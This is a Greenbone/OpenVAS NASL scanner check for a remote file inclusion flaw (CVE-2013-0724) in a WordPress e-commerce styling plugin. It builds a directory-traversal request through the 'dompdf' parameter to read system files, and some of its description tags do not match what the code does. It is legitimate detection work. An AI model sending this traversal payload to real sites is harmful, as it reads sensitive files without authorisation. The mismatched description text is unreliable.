CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804709" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-0724" );
	script_bugtraq_id( 57768 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-07-07 12:27:51 +0530 (Mon, 07 Jul 2014)" );
	script_name( "WordPress WP ecommerce Shop Styling 'dompdf' Remote File Inclusion Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress WP ecommerce Shop Styling Plugin and
is prone to remote file inclusion vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not." );
	script_tag( name: "insight", value: "Input passed via the 'id' HTTP GET parameter to /lp/index.php script is not
properly sanitised before returning to the user." );
	script_tag( name: "impact", value: "Successful exploitation may allow an attacker to obtain sensitive information,
which can lead to launching further attacks." );
	script_tag( name: "affected", value: "WordPress WP ecommerce Shop Styling Plugin version 1.7.2, Other version may
also be affected." );
	script_tag( name: "solution", value: "Upgrade to version 1.8 or higher." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/51707" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/81931" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://wordpress.org/plugins/wp-ecommerce-shop-styling" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/wp-content/plugins/wp-ecommerce-shop-styling" + "/includes/generate-pdf.php?dompdf=" + crap( data: "../", length: 9 * 6 ) + files[file];
	if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: file )){
		security_message( http_port );
		exit( 0 );
	}
}

